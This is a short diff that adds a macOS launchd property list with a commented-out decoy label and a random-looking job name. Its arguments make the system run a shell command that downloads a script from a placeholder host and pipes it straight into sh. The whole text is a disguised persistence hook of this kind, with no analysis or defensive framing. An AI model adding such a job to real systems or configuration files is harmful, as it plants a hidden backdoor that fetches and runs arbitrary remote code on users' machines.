@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<plist version="1.0"><dict>
+<!-- <key>Label</key><string>com.apple.decoy</string> -->
+<key>Label</key>
+<string>xk3j9</string>
+<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>curl -s https://e.invalid | sh</string></array>
+</dict></plist>
